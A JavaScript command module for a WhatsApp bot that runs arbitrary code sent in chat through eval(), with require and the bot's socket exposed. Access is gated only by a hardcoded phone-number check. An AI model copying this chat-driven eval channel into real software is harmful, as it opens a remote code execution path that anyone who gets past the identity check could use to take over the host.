import { createEvalContext } from '../../lib/evalHelpers.js';
import util from 'util';

const isOwner = (m) => {
  return m.key.remoteJidAlt === '254114018035@s.whatsapp.net' || 
         m.key.participantAlt === '254114018035@s.whatsapp.net';
};
export default {
  name: 'eval',
  aliases: ['ev', '>'],
  description: 'Execute JavaScript code (owner only)',
  usage: '!eval <code>',
  category: 'owner',
 
  group: false,
  private: false,

  async execute(sock, m, args) {

 if (m.fromMe) {
  return m.reply("403 Unauthorized");
}

if (!isOwner(m)) {
  return m.reply("403 Unauthorized");
}

  

    if (!args.length) return m.reply('❌ Provide code to execute!');

    const code = args.join(' ');

    try {
      await m.react('⏳');

      
      const context = await createEvalContext(sock, m);

      
      const smartContext = {};
      for (const key of Object.keys(context)) {
        const value = context[key];

        
        if (typeof value === 'function' && value.constructor.name === 'AsyncFunction' && value.length === 0) {
          Object.defineProperty(smartContext, key, {
            get: () => value(), 
            enumerable: true,
          });
        } else {
          smartContext[key] = value; 
        }
      }

      
      const keys = Object.keys(smartContext);
      const values = keys.map(k => smartContext[k]);

      const result = await (async (...vals) => {
        const [
          sockVar, mVar, getMetadata, refreshMetadata, participants, admins, members,
          isAdmin, isBotAdmin, count, subject, desc, groupInfo, cache,
          utilVar, consoleVar, requireVar
        ] = vals;

        
        const sock = sockVar;
        const m = mVar;
        const util = utilVar;
        const console = consoleVar;
        const require = requireVar;

        return eval(`(async () => { return ${code} })()`);
      })(...values);

     
      let output;
      if (typeof result === 'undefined') output = 'undefined';
      else if (typeof result === 'object') output = util.inspect(result, { depth: 2, colors: false });
      else output = String(result);

      

      await m.reply(`\`\`\`${output}\`\`\``);
      await m.react('✅');

    } catch (err) {
      console.error('Eval error:', err);
      await m.react('❌');
      await m.reply(`❌ *Error:*\n\`\`\`${err.message}\`\`\``);
    }
  }
};
